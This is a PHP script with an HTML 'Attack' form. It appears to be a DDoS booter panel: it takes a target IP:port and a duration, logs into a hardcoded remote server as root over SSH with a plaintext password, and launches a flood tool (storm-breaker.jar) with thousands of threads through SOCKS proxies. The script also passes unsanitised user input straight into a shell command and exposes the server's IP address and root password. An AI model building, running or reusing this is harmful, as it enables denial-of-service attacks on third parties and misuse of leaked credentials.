<pre>
<form action="api.php" method="GET">

<p>APIKey <input type="text" name="apikey"></p>
<p>IP:Port <input type="text" name="ip_port"></p>
<p>Time <input type="text" name="time"></p>
<input type="submit" value="Attack">
</form>

<hr>

<?php
//BY NZXTERCODE https://dsc.gg/nzxterdc

if(isset($_GET['apikey']) && isset($_GET['ip_port']) && isset($_GET['time']))
{
	
$apikey = $_GET['apikey'];	
$ip_port = $_GET['ip_port'];
$time = $_GET['time'];

if ($apikey != "123"){
die('Incorrect API key!');}

if ($time > 60){
die('Cannot exceed 60 seconds!');}

$command = "screen -dm java -jar /root/storm-breaker.jar host=$ip_port srvResolve=true srvResolve2=false alwaysResolve=false threads=7000 connections=100 multi=false removeFailure=true socksV4=true loopAmount=500 timeout=2500 keepAlive=false proxiesType=socks print=true proxiesFile=socks.txt attackTime=$time exploit=yooniksbypass2";

if (!function_exists("ssh2_connect")) die("SSH2 does not exist on you're server");
if(!($con = ssh2_connect("40.68.134.174", 22))){
  echo "Connection Issue";
} else {
 
    if(!ssh2_auth_password($con, "root", "ewasGkRKzZEzyAdh")) {
        echo "Login failed, one or more of you're server credentials are incorect.";
    } else {
 
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "You're server was not able to execute you're methods file and or its dependencies";
        } else {
   
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started <br>IP Adresse = $ip_port Time = $time<br>";
            fclose($stream);
        }
	}
}
}

//BY NZXTERCODE https://dsc.gg/nzxterdc
?>
</pre>